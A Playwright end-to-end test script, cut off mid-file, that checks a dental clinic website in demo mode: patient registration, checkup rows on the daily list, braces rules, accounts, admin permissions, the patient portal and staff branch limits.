// End-to-end check of the website in DEMO mode with a real headless browser.
// Usage: node tests/ui.spec.mjs [baseUrl] [screenshotDir]
import { chromium } from 'playwright';
import assert from 'node:assert/strict';
import fs from 'node:fs';

const BASE = process.argv[2] || 'http://localhost:8765/';
const SHOTS = process.argv[3] || null;
if (SHOTS) fs.mkdirSync(SHOTS, { recursive: true });

const browser = await chromium.launch({ executablePath: process.env.CHROME_PATH || undefined });
const errors = [];
let passed = 0;
// A step that makes the app fail on purpose (a function that is too old, a dropped connection) expects the console.error the app writes for it.
const expectErrors = (re) => { for (let i = errors.length - 1; i >= 0; i -= 1) if (re.test(errors[i])) errors.splice(i, 1); };

async function newPage(viewport = { width: 1366, height: 860 }, options = {}) {
  const page = await browser.newPage({ viewport, ...options });
  // Demo mode needs nothing from the internet; outside hosts (fonts, CDN) are cut off so a slow network cannot hang the test.
  await page.route((url) => !/^(localhost|127\.0\.0\.1)$/.test(url.hostname) && url.protocol.startsWith('http'), (r) => r.abort());
  // The live site has its Supabase keys filled in; the test always runs the made-up DEMO data instead.
  await page.route('**/js/config.js', async (r) => {
    const res = await r.fetch();
    const body = (await res.text()).replace(/SUPABASE_URL: '[^']*'/, "SUPABASE_URL: ''").replace(/SUPABASE_ANON_KEY: '[^']*'/, "SUPABASE_ANON_KEY: ''");
    await r.fulfill({ response: res, body });
  });
  page.setDefaultTimeout(15000);
  page.on('pageerror', (e) => errors.push(`pageerror: ${e.message}`));
  page.on('console', (m) => { if (m.type() === 'error' && !/fonts\.(googleapis|gstatic)|ERR_|Failed to load resource/.test(m.text())) errors.push(`console: ${m.text()}`); });
  // A refused or reset load from the site's own host would otherwise show up only as a 15 s timeout.
  page.on('requestfailed', (r) => {
    if (/^https?:\/\/(localhost|127\.0\.0\.1)[:/]/.test(r.url()) && !/ERR_ABORTED/.test(r.failure()?.errorText || '')) errors.push(`requestfailed: ${r.url()} ${r.failure()?.errorText}`);
  });
  return page;
}
async function step(name, fn) {
  try { await fn(); passed++; console.log('ok -', name); } catch (e) {
    console.log('FAIL -', name, '\n   ', e.message.split('\n')[0]); process.exitCode = 1;
    // Close any dialog the failed step left open, so it cannot block the next step.
    for (const pg of browser.contexts().flatMap((c) => c.pages())) await pg.keyboard.press('Escape').catch(() => {});
  }
}
const shot = async (page, name) => { if (SHOTS) await page.screenshot({ path: `${SHOTS}/${name}.png`, fullPage: false }); };
async function loginAs(page, label) {
  await page.goto(BASE + '#/login/staff');
  await page.getByRole('button', { name: new RegExp(label) }).click();
  await page.waitForSelector('.topbar');
}

// ------------------------------------------------------------- public
const page = await newPage();
await step('home shows the smile, three doors and calendar', async () => {
  await page.goto(BASE);
  // With WebGL the hero is the photo card (canvas) and the CSS arch is hidden; without it the 24 CSS teeth show.
  await page.waitForSelector('.smile-stage.has-card canvas, .smile-stage:not(.has-card) .tooth');
  // The week with Dr. Ali fills in when the (demo) database answers, after the hero is already there: wait for it, or a slow first load
  // counts 0 days (this first step failed now and then on a slow first load, and its messages did not say which count was wrong).
  await page.locator('.sx-day').first().waitFor();
  assert.equal(await page.locator('.tooth').count(), 24, 'tooth count');
  for (const t of ['Patient', 'Visitor', 'Employee']) assert.ok(await page.locator('.door', { hasText: t }).count(), `door ${t}`);
  assert.equal(await page.locator('.sx-day').count(), 7, 'sx-day count');
  await shot(page, '01-home');
});
await step('visitor page lists benefits, braces options and WhatsApp button', async () => {
  await page.click('.door:has-text("Visitor")');
  await page.waitForSelector('.brace-card');
  assert.ok((await page.locator('.benefit').count()) >= 6);
  assert.ok(await page.locator('a:has-text("Message on WhatsApp")').count());
  await shot(page, '02-visitor');
});

// ------------------------------------------------------------- front desk
await step('front desk sees only their branch and the Aaj ki List', async () => {
  await loginAs(page, 'Front desk \\(North Nazimabad\\)');
  await page.locator('.topnav .menu:has-text("Aaj ki List") > button').click();
  await page.locator('.topnav .menu-list a:has-text("Aaj ki List")').click();
  await page.waitForSelector('table.sheet tbody tr');
  const options = await page.locator('.sheet-toolbar select').first().locator('option').allTextContents();
  assert.deepEqual(options, ['North Nazimabad']);
  assert.ok((await page.locator('table.sheet tbody tr').count()) >= 5);
  assert.ok(await page.locator('.badge-dues').count(), 'dues flag visible');
  await shot(page, '03-sheet-frontdesk');
});
await step('front desk registers a new patient and gets the next Mr# (the website numbers from 50000, clear of Healthwire)', async () => {
  await page.fill('.add-panel input[type=search]', 'Komal Test');
  await page.click('.suggestions button:has-text("New patient")');
  await page.fill('.modal input[type=tel]', '0300 1234567');
  await page.click('.modal button:has-text("Create patient")');
  await page.waitForSelector('.toast:has-text("Mr# 50000")');
  await page.waitForSelector('table.sheet tbody tr:has-text("Komal Test")');
});
await step('front desk adds a walk-in with the "+ New walk-in" button', async () => {
  await page.click('.add-panel button:has-text("New walk-in")');
  await page.fill('.modal input[required]:not([type=tel])', 'Walkin Person');
  await page.fill('.modal input[type=tel]', '0301 7654321');
  await page.click('.modal button:has-text("Create patient")');
  await page.waitForSelector('table.sheet tbody tr:has-text("Walkin Person")');
});
await step('front desk cannot see accounts or admin', async () => {
  const nav = (await page.locator('.topnav a, .topnav .menu-list a').allTextContents()).map((t) => t.trim());
  assert.ok(!nav.includes('Access list') && !nav.includes('Staff accounts'));
  assert.ok(!nav.includes('Complaints'));
  assert.ok(!nav.includes('Financial'));
});
await step('front desk may make a patient portal login (owner decision, 9 Oct 2026): the button shows on the patient just registered and the username carries Mr# 50000', async () => {
  await page.goto(BASE + '#/staff/patients?q=Komal%20Test');
  await page.locator('table.list tbody tr', { hasText: 'Komal Test' }).locator('a').first().click();
  await page.waitForSelector('h1:has-text("Komal Test")');
  await page.locator('.portal-login-line', { hasText: 'Portal login: none yet' }).waitFor();
  await page.getByRole('button', { name: 'Create portal login' }).click();
  const m = page.locator('.modal');
  assert.equal(await m.locator('input[readonly]').inputValue(), 'komaltest-50000@dralirashid.com');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await m.waitFor({ state: 'detached' });
});
await step('top bar: patient search by name, Mr# and phone from any screen', async () => {
  const box = page.locator('.topsearch input');
  await box.fill('9812');
  await page.waitForSelector('.search-results a:has-text("Mr# 9812")');
  await box.fill('Hamza');
  await page.waitForSelector('.search-results a:has-text("Hamza Qureshi")');
  await box.fill('03010734521');
  await page.waitForSelector('.search-results a:has-text("Hamza Qureshi")');
  await page.locator('.search-results a').first().click();
  await page.waitForSelector('h1:has-text("Hamza Qureshi")');
  await box.fill('Zainab');
  await box.press('Enter');
  await page.waitForSelector('table.list tbody tr:has-text("Zainab Rizvi")');
  assert.equal(await page.locator('table.list tbody tr').count(), 1, 'Enter opens the Patients page with the search');
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr');
});
await step('auto-save: editing treatment details shows saved state', async () => {
  const input = page.locator('table.sheet tbody tr:has-text("Komal Test") input[aria-label^="Treatment details"]');
  await input.fill('U L 018 PC refresh');
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
});
await step('flag patient for Dr. Ali from the sheet', async () => {
  await page.click('table.sheet tbody tr:has-text("Komal Test") .frozen .link-btn');
  await page.click('.modal button:has-text("Next appointment with Dr. Ali")');
  await page.locator('.modal').last().locator('textarea').fill('Bracket keeps breaking');
  await page.click('.modal button:has-text("Flag for Dr. Ali")');
  await page.waitForSelector('.toast:has-text("Flagged")');
  await page.keyboard.press('Escape');
});

// ------------------------------------------------------------- checkup patients on the Aaj ki List (front desk, North Nazimabad)
// (Checkup patients have no Mr#. Made-up names only; the demo keeps its data in memory, so the browser is never reloaded here.)
const checkupRow = (pg, name) => pg.locator(`table.sheet tbody tr.is-checkup:has(input[aria-label="Name of checkup patient ${name}"])`);
await step('front desk: the Aaj ki List shows the checkup patients of the day with a "Checkup" badge and no Mr#, after the patients', async () => {
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr.is-checkup');
  const seeded = page.locator('table.sheet tbody tr.is-checkup');
  assert.ok((await seeded.count()) >= 2, 'the two seeded checkups of North Nazimabad');
  assert.ok(await seeded.first().locator('.badge-checkup:has-text("Checkup")').count(), 'badge');
  assert.match(await seeded.first().locator('th').innerText(), /no Mr#/);
  assert.equal(await seeded.first().locator('.quick-tap').count(), 0, 'no quick-tap button on a checkup row');
  const kinds = await page.locator('table.sheet tbody tr').evaluateAll((trs) => trs.map((t) => t.classList.contains('is-checkup')));
  assert.ok(kinds.indexOf(false) >= 0 && kinds.lastIndexOf(false) < kinds.indexOf(true), 'visit rows first, then the checkup rows');
  assert.match(await page.locator('.page-head p').innerText(), /\d+ checkups/);
  await shot(page, '14-sheet-checkups');
});
await step('front desk: "+ Checkup patient" adds a checkup patient (no Mr#); details and status save; the row can be removed', async () => {
  await page.getByRole('button', { name: '+ Checkup patient' }).click();
  const m = page.locator('.modal');
  await m.getByLabel(/^Name/).fill('Checkup Test Person');
  await m.getByLabel(/^Phone number/).fill('0300 5550101');
  await m.getByLabel('Treatment', { exact: true }).fill('Scaling');
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await page.waitForSelector('.toast:has-text("Checkup Test Person added as a checkup patient")');
  const row = checkupRow(page, 'Checkup Test Person');
  await row.waitFor();
  assert.equal(await row.locator('input[aria-label^="Treatment for"]').inputValue(), 'Scaling');
  assert.equal(await row.locator('input[aria-label^="Phone for"]').inputValue(), '0300 5550101');
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'waiting', 'today: waiting');
  assert.doesNotMatch(await row.locator('th').innerText(), /Mr# \d/);
  await row.locator('input[aria-label^="Treatment details"]').fill('Scaling advised');
  await page.waitForTimeout(1200);
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  assert.equal((await page.locator('.save-state').innerText()).trim(), 'All changes saved');
  await row.locator('select[aria-label^="Status for"]').selectOption('completed');
  await page.waitForTimeout(300);
  // Today reloads the list from the data layer: the typed details and the status are really saved.
  await page.getByRole('button', { name: 'Today', exact: true }).click();
  await row.waitFor();
  assert.equal(await row.locator('input[aria-label^="Treatment details"]').inputValue(), 'Scaling advised');
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'completed');
  // Options -> Remove -> confirm
  await row.getByRole('button', { name: /Checkup options/ }).click();
  await page.locator('.modal').getByRole('button', { name: 'Remove from the list' }).click();
  await page.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
  await row.waitFor({ state: 'detached' });
});
await step('front desk: a checkup patient whose phone belongs to a patient file is offered "Add Mr# N to the list instead"', async () => {
  await page.getByRole('button', { name: '+ Checkup patient' }).click();
  const m = page.locator('.modal');
  await m.getByLabel(/^Name/).fill('Dup Check Person');
  await m.getByLabel(/^Phone number/).fill('03010734521');
  await m.getByLabel(/^Phone number/).press('Tab');
  await m.locator('.alert-warning:has-text("already has a patient file")').waitFor();
  const text = await m.locator('.alert-warning').innerText();
  const mr = text.match(/Mr# (\d+)/)[1];
  const before = await page.locator('table.sheet tbody tr:not(.is-checkup)', { hasText: `Mr# ${mr}` }).count();
  await m.getByRole('button', { name: `Add Mr# ${mr} to the list instead` }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  await page.waitForFunction(([n, count]) => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')].filter((t) => t.textContent.includes(`Mr# ${n}`)).length === count, [mr, before + 1]);
  assert.equal(await page.locator('table.sheet tbody tr.is-checkup:has(input[aria-label="Name of checkup patient Dup Check Person"])').count(), 0, 'no checkup was made');
});
await step('front desk: the status filter and the find box apply to the checkup rows, and the dues filter hides them', async () => {
  await page.locator('select[aria-label="Filter by status"]').selectOption('completed');
  const kinds = await page.locator('table.sheet tbody tr.is-checkup select[aria-label^="Status for"]').evaluateAll((els) => els.map((e) => e.value));
  assert.ok(kinds.every((v) => v === 'completed'), 'only completed checkups');
  await page.locator('select[aria-label="Filter by status"]').selectOption('');
  await page.locator('label:has-text("With dues") input').check();
  assert.equal(await page.locator('table.sheet tbody tr.is-checkup').count(), 0, 'the dues filter hides checkups');
  await page.locator('label:has-text("With dues") input').uncheck();
  await page.locator('input[aria-label="Find on this list"]').fill('checkup');
  assert.ok((await page.locator('table.sheet tbody tr.is-checkup').count()) >= 2, 'the word "checkup" finds checkup rows');
  await page.locator('input[aria-label="Find on this list"]').fill('');
});

await step('front desk: "Register as patient" on a checkup row gives an Mr#, and "Put Mr# N on this list" turns the row into a patient row', async () => {
  await page.getByRole('button', { name: '+ Checkup patient' }).click();
  const m = page.locator('.modal');
  await m.getByLabel(/^Name/).fill('Register Flow Person');
  await m.getByLabel(/^Phone number/).fill('0300 5550104');
  await m.getByLabel('Treatment', { exact: true }).fill('Whitening');
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  const row = checkupRow(page, 'Register Flow Person');
  await row.waitFor();
  await row.getByRole('button', { name: /Checkup options/ }).click();
  await page.locator('.modal').getByRole('button', { name: 'Register as patient' }).click();
  const dlg = page.locator('.modal');
  await dlg.getByRole('button', { name: 'Create patient file' }).click();
  await dlg.locator('.registered-mr').waitFor();
  const mr = (await dlg.locator('.registered-mr').innerText()).match(/Registered: Mr# (\d+)/)[1];
  await dlg.getByRole('button', { name: `Put Mr# ${mr} on this list` }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  const visit = page.locator('table.sheet tbody tr:not(.is-checkup)', { hasText: `Mr# ${mr}` });
  await visit.waitFor();
  assert.equal(await visit.locator('input[aria-label^="Treatment for"]').inputValue(), 'Whitening', 'the visit carries what the checkup was for');
  assert.equal(await row.count(), 0, 'the checkup row is now a patient row');
  await page.goto(BASE + '#/staff/checkups?q=5550104');
  const link = page.locator('table.checkup-table tbody tr[data-id] a.mr');
  await link.waitFor();
  assert.equal((await link.innerText()).trim(), `Mr# ${mr}`, 'the Checkups page keeps the person, now with the Mr#');
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr');
});
await step('front desk: the arrow keys move between the name cells of checkup rows', async () => {
  await page.waitForSelector('table.sheet tbody tr.is-checkup');
  const names = page.locator('table.sheet tbody tr.is-checkup input[data-field="patient_name"]');
  assert.ok((await names.count()) >= 2);
  await names.nth(0).focus();
  await page.keyboard.press('ArrowDown');
  assert.equal(await page.evaluate(() => document.activeElement?.getAttribute('aria-label')), await names.nth(1).getAttribute('aria-label'));
});

await step('front desk: the same phone number twice on one day\'s list is flagged before the second checkup is added', async () => {
  const add = async (name, phone) => {
    await page.getByRole('button', { name: '+ Checkup patient' }).click();
    const m = page.locator('.modal');
    await m.getByLabel(/^Name/).fill(name);
    await m.getByLabel(/^Phone number/).fill(phone);
    await m.getByLabel(/^Phone number/).press('Tab');
    return m;
  };
  const first = await add('Twice Typed Person', '0300 5550955');
  assert.equal(await first.locator('.alert-warning:has-text("Already on the list for")').count(), 0, 'nothing to warn about the first time');
  await first.getByRole('button', { name: 'Add checkup patient' }).click();
  await checkupRow(page, 'Twice Typed Person').waitFor();
  const second = await add('Twice Typed Person', '0300-555 0955');
  await second.locator('.alert-warning:has-text("Already on the list for")').waitFor();
  assert.match(await second.locator('.alert-warning').innerText(), /Twice Typed Person \(0300 5550955\)\. Press Cancel unless this is a different person\./);
  // a different number is not flagged, and adding anyway stays possible
  await second.getByLabel(/^Phone number/).fill('0300 5550957');
  await second.getByLabel(/^Phone number/).press('Tab');
  await page.waitForFunction(() => !document.querySelector('.modal .alert-warning'));
  await second.getByRole('button', { name: 'Cancel' }).click();
  await page.waitForSelector('.modal', { state: 'detached' });
  const row = checkupRow(page, 'Twice Typed Person');
  await row.getByRole('button', { name: /Checkup options/ }).click();
  await page.locator('.modal').getByRole('button', { name: 'Remove from the list' }).click();
  await page.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
  await row.waitFor({ state: 'detached' });
});
await step('front desk: the token of a checkup row can be typed and saved (a website checkup has none until someone writes one)', async () => {
  const row = checkupRow(page, 'Bareera Khalid');
  const token = row.locator('input[aria-label^="Token of checkup patient"]');
  await token.waitFor();
  assert.equal(await token.inputValue(), '', 'no token yet');
  await token.fill('9');
  await token.press('Tab');
  await page.waitForTimeout(1200);
  await page.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  await page.getByRole('button', { name: 'Today', exact: true }).click();
  await row.waitFor();
  assert.equal(await row.locator('input[aria-label^="Token of checkup patient"]').inputValue(), '9', 'saved, and still there after the list is read again');
  await row.locator('input[aria-label^="Token of checkup patient"]').fill('');
  await row.locator('input[aria-label^="Token of checkup patient"]').press('Tab');
  await page.waitForTimeout(1200);
  await page.getByRole('button', { name: 'Today', exact: true }).click();
  await row.waitFor();
  assert.equal(await row.locator('input[aria-label^="Token of checkup patient"]').inputValue(), '', 'and can be cleared');
});
await step('front desk: the top search tells where a checkup patient is (no Mr#), with a link to the Checkups page', async () => {
  await page.getByLabel('Search patients').fill('Bareera');
  const results = page.locator('.search-results:has-text("No patient matches")');
  await results.waitFor();
  assert.match(await results.innerText(), /Checkup patients have no Mr#/);
  await results.getByRole('link', { name: 'Look on the Checkups page' }).click();
  await page.waitForSelector('h1:has-text("Checkups")');
  await page.waitForFunction(() => {
    const rows = [...document.querySelectorAll('table.checkup-table tbody tr[data-id]')];
    return rows.length > 0 && rows.every((t) => t.textContent.includes('Bareera'));
  });
  assert.match(await page.evaluate(() => location.hash), /checkups[?]q=Bareera/);
  // a phone number is carried over as its digits (4 or more)
  await page.getByLabel('Search patients').fill('0300-5550701');
  const again = page.locator('.search-results:has-text("No patient matches")');
  await again.waitFor();
  assert.match(await again.getByRole('link', { name: 'Look on the Checkups page' }).getAttribute('href'), /checkups[?]q=03005550701$/);
  await page.getByLabel('Search patients').fill('');
  await page.goto(BASE + '#/staff/sheet');
  await page.waitForSelector('table.sheet tbody tr.is-checkup');
});

// ------------------------------------------------------------- assistant + braces rules
const p2 = await newPage();
await step('assistant: braces month guidance and group rule', async () => {
  await loginAs(p2, 'Assistant');
  await p2.goto(BASE + '#/staff/sheet?branch=2');
  await p2.waitForSelector('table.sheet tbody tr');
  const monthBtn = p2.locator('table.sheet tbody tr .month-pill').first();
  await monthBtn.click();
  await p2.waitForSelector('.modal .stat');
  await shot(p2, '04-braces-guidance');
  await p2.keyboard.press('Escape');
});
await step('a Group 3 doctor is refused on a Group 1/2 month', async () => {
  // Find a waiting braces row whose month allows only Group 1/2 and try a Group 3 doctor
  const rows = p2.locator('table.sheet tbody tr');
  const n = await rows.count();
  let tried = false;
  for (let i = 0; i < n; i++) {
    const hint = await rows.nth(i).locator('.people .field-hint [aria-hidden="true"]').textContent({ timeout: 1000 }).catch(() => '');
    if (hint.startsWith('G1/2') || hint === 'G1 · check G1') {
      await rows.nth(i).locator('.add-person').click();
      await p2.click('.modal button:has-text("Dr. Nida (sample)")');
      await p2.waitForSelector('.toast-error');
      tried = true;
      await p2.keyboard.press('Escape');
      break;
    }
  }
  assert.ok(tried, 'found a Group 1/2 month row to test');
});
await step('photo month cannot be completed without photos', async () => {
  const row = p2.locator('table.sheet tbody tr:has(.badge-photo)').first();
  if (await row.count()) {
    await row.locator('select[aria-label^="Status"]').selectOption('completed');
    await p2.waitForSelector('.toast-error');
  }
});

// ------------------------------------------------------------- accountant
const p3 = await newPage();
await step('accountant: P&L, expense entry and cash verification', async () => {
  await loginAs(p3, 'Accountant');
  await p3.goto(BASE + '#/staff/accounts');
  await p3.waitForSelector('.tab');
  await p3.getByRole('tab', { name: 'Expenses', exact: true }).click();
  await p3.getByLabel('Category').selectOption({ label: 'Rent' });
  await p3.getByLabel('Amount').fill('120000');
  await p3.locator('input[aria-label="Receipt photo"]').setInputFiles({ name: 'rent-receipt.png', mimeType: 'image/png', buffer: Buffer.from('89504e470d0a1a0a', 'hex') });
  await p3.click('button:has-text("Save expense")');
  await p3.waitForSelector('.toast:has-text("Expense")');
  await p3.waitForSelector('table.list tbody tr:has-text("Rent") button:has-text("View")');
  await p3.click('.tab:has-text("Branch income")');
  await p3.waitForSelector('table.list');
  await shot(p3, '05-accounts');
});

// ------------------------------------------------------------- admin
const p4 = await newPage();
await step('admin: access list checkboxes change permissions', async () => {
  await loginAs(p4, 'Dr. Ali Rashid');
  await p4.locator('.topnav .menu:has-text("More") > button').click();
  await p4.locator('.topnav .menu-list a:has-text("Access list")').click();
  await p4.waitForSelector('table.perm-grid');
  const box = p4.getByLabel('Assistant: Register new patients (auto Mr#)');
  assert.equal(await box.isChecked(), false);
  await box.check();
  await p4.waitForSelector('.toast:has-text("allowed")');
  await shot(p4, '06-access-list');
});
await step('admin: dashboard, Dr. Ali list and complaints', async () => {
  await p4.click('.topnav a:has-text("Today")');
  await p4.waitForSelector('.stat');
  await shot(p4, '07-today');
  await p4.locator('.topnav .menu:has-text("More") > button').click();
  await p4.locator('.topnav .menu-list a:has-text("Dr. Ali\'s list")').click();
  await p4.waitForSelector('table.list');
  assert.ok((await p4.locator('table.list tr').count()) >= 1);
  await p4.goto(BASE + '#/staff/complaints');
  await p4.waitForSelector('table.list');
});
await step('admin: patient profile with braces guidance', async () => {
  await p4.click('.topnav a:has-text("Patients")');
  await p4.waitForSelector('table.list tbody tr');
  await p4.click('table.list tbody tr:has(.badge:has-text("Braces")) a');
  await p4.waitForSelector('h2:has-text("Braces")');
  await shot(p4, '08-patient-profile');
});
await step('admin: adds a consent form to the patient record', async () => {
  await p4.waitForSelector('h2:has-text("Documents")');
  await p4.click('button:has-text("Add document")');
  await p4.setInputFiles('.modal input[type=file]', { name: 'consent.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4 test') });
  await p4.click('.modal button:has-text("Save")');
  await p4.waitForSelector('.toast:has-text("Document saved")');
  await p4.waitForSelector('table.list td:has-text("Consent form")');
  assert.ok(await p4.locator('a:has-text("Open")').count());
});

// ------------------------------------------------------------- patient portal
const p5 = await newPage({ width: 390, height: 844 });
await step('patient portal on a phone: complaint goes to Dr. Ali', async () => {
  await p5.goto(BASE + '#/login/patient');
  await p5.click('.demo-accounts button');
  await p5.waitForSelector('h1:has-text("Hello")');
  await shot(p5, '09-portal-mobile');
  await p5.click('button:has-text("Report / complain")');
  await p5.fill('.modal input', 'Waiting time');
  await p5.fill('.modal textarea', 'Waited too long');
  await p5.click('.modal button:has-text("Send to Dr. Ali")');
  await p5.waitForSelector('.toast:has-text("Sent")');
});
await step('sample patient account opens without a login and shows photos, dues and a reply', async () => {
  await p5.goto(BASE + '#/');
  await p5.click('a:has-text("See a sample patient account")');
  await p5.waitForSelector('.sample-banner');
  await p5.waitForSelector('h1:has-text("Hello")');
  assert.equal(await p5.locator('.photo-grid img').count(), 2, 'two sample photos');
  assert.ok(await p5.locator('.alert-info:has-text("Your next appointment")').count(), 'next appointment');
  assert.ok(await p5.locator('text=Reply from the clinic').count(), 'reply shown');
  assert.ok(await p5.locator('button:has-text("Rate this visit")').count(), 'rating button is live');
  await shot(p5, '09b-portal-sample');
});
const p7 = await newPage();
await step('Dr. Ali creates a staff login with a password, then changes its email and password', async () => {
  await loginAs(p7, 'Dr. Ali Rashid');
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  await p7.getByRole('button', { name: 'New staff account' }).click();
  const m = p7.locator('.modal');
  await m.getByPlaceholder('Full name').fill('Test Reception');
  await m.locator('input[type=email]').fill('test.reception@dralirashid.com');
  const pw = await m.locator('input[autocomplete=new-password]').inputValue();
  assert.match(pw, /^[A-Z][a-z]{4}-\d{4}$/);
  await m.getByRole('button', { name: 'Create account' }).click();
  await p7.waitForSelector('td:text("test.reception@dralirashid.com")');
  await p7.locator('tr', { hasText: 'test.reception@dralirashid.com' }).getByRole('button', { name: /^Login and password/ }).click();
  const lm = p7.locator('.modal');
  await lm.locator('input[type=email]').fill('dha.reception@dralirashid.com');
  await lm.getByLabel(/Set a new password/).check();
  await lm.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('td:text("dha.reception@dralirashid.com")');
  assert.equal(await p7.locator('td:text("test.reception@dralirashid.com")').count(), 0);
  assert.ok(await p7.locator('th:text("Last login")').count(), 'last login column');
  assert.ok(await p7.locator('tr:has-text("Dr. Ali Rashid") td:has-text("Never")').count() === 0, "Dr. Ali's own login is recorded");
  await shot(p7, '11-staff-accounts');
});
// The Branches dialog on Admin → Staff accounts. dha.reception (made above) starts with no limit, so it shows All.
const branchLogin = 'dha.reception@dralirashid.com';
const branchesCell = (page, login) => page.locator('tr', { hasText: login }).locator('td').nth(3);
const openBranches = async (page, login) => { await page.locator('tr', { hasText: login }).getByRole('button', { name: /^Branches/ }).click(); return page.locator('.modal'); };
// Switch the DHA branch off (or on) in Clinic setup, then come back to Staff accounts.
const switchDha = async (open) => {
  await p7.goto(BASE + '#/staff/admin?tab=setup');
  await p7.waitForSelector('h2:text("Treatments")');
  await p7.getByRole('button', { name: 'Edit DHA Karachi', exact: true }).click();
  const bm = p7.locator('.modal');
  const box = bm.getByLabel('Open (shown on the website)');
  if (open) await box.check(); else await box.uncheck();
  await bm.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Saved")');
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  await p7.waitForSelector(`tr:has-text("${branchLogin}")`);
};
await step('Dr. Ali changes the branches a staff member works at, and is asked before a limit is lifted', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  assert.equal(await p7.locator('tr', { hasText: 'Dr. Ali Rashid' }).getByRole('button', { name: /^Branches/ }).count(), 0, "no Branches button on the admin's own row");
  // An account with no limit starts on All branches; ticking branches clears it.
  let m = await openBranches(p7, branchLogin);
  assert.ok(await m.getByLabel('All branches', { exact: true }).isChecked(), 'no limit starts on All branches');
  // The dialog says what a limit really covers: the Aaj ki List, invoices and payments, not patient records.
  const intro = await m.innerText();
  assert.match(intro, /Aaj ki List, invoices and payments of these branches/);
  assert.match(intro, /patient records are shared by every branch/);
  assert.doesNotMatch(intro, /enter patients/, 'it must not promise that patients are hidden');
  await m.getByLabel('DHA Karachi', { exact: true }).check();
  await m.getByLabel('Islamabad', { exact: true }).check();
  assert.ok(!(await m.getByLabel('All branches', { exact: true }).isChecked()), 'ticking a branch clears All');
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("DHA Karachi, Islamabad")`);
  // Reopened, the dialog is ticked from the saved account.
  m = await openBranches(p7, branchLogin);
  assert.ok(await m.getByLabel('DHA Karachi', { exact: true }).isChecked() && await m.getByLabel('Islamabad', { exact: true }).isChecked(), 'ticked from the saved branches');
  assert.ok(!(await m.getByLabel('Gulshan (RJ Mall)', { exact: true }).isChecked()), 'other branches stay unticked');
  // Unticking the last branch means every branch again. That lifts a limit, so Save asks for a tick first.
  const sure = m.getByLabel(/may see every branch/);
  assert.ok(!(await sure.isVisible()), 'no question while the account stays limited');
  await m.getByLabel('DHA Karachi', { exact: true }).uncheck();
  await m.getByLabel('Islamabad', { exact: true }).uncheck();
  assert.ok(await m.getByLabel('All branches', { exact: true }).isChecked(), 'clearing the last branch falls back to All');
  assert.ok(await sure.isVisible(), 'lifting the limit asks for a tick');
  await m.getByRole('button', { name: 'Save' }).click();
  await m.locator('[data-field-error]').waitFor();
  assert.ok(await m.isVisible(), 'the dialog stays open until the tick is given');
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), 'DHA Karachi, Islamabad', 'nothing saved without the tick');
  await sure.check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("All")`);
  // Setting a limit on an account that had none is never asked about.
  m = await openBranches(p7, branchLogin);
  await m.getByLabel('Gulshan (RJ Mall)', { exact: true }).check();
  assert.ok(!(await sure.isVisible()), 'no question when a limit is set');
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("Gulshan (RJ Mall)")`);
});
await step('A switched-off branch is kept when branches are saved, and Save alone cannot lift the limit', async () => {
  // dha.reception works at Gulshan only (set above). Move them to DHA only, then switch DHA off in Clinic setup.
  let m = await openBranches(p7, branchLogin);
  await m.getByLabel('DHA Karachi', { exact: true }).check();
  await m.getByLabel('Gulshan (RJ Mall)', { exact: true }).uncheck();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("DHA Karachi")`);
  await switchDha(false);
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), '1 switched-off branch', 'a switched-off branch is counted, not left blank');
  m = await openBranches(p7, branchLogin);
  assert.ok(!(await m.getByLabel('All branches', { exact: true }).isChecked()), 'an account limited to a switched-off branch is not shown as All');
  assert.equal(await m.getByLabel('DHA Karachi', { exact: true }).count(), 0, 'a switched-off branch is not offered');
  assert.match(await m.innerText(), /Also kept: 1 switched-off branch/);
  // Pressing Save without a change must not turn the account into All branches.
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Nothing changed")');
  assert.ok(await m.isVisible(), 'the dialog stays open');
  // Adding a branch keeps the switched-off one.
  await m.getByLabel('Islamabad', { exact: true }).check();
  assert.ok(!(await m.getByLabel('All branches', { exact: true }).isChecked()));
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("Islamabad, 1 switched-off branch")`);
  // Switch DHA back on: the kept branch is shown by name again. Then put the account back to All.
  await switchDha(true);
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), 'Islamabad, DHA Karachi');
  m = await openBranches(p7, branchLogin);
  await m.getByLabel('All branches', { exact: true }).check();
  await m.getByLabel(/may see every branch/).check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("All")`);
});
await step('"All branches" can be chosen for an account that still has a switched-off branch', async () => {
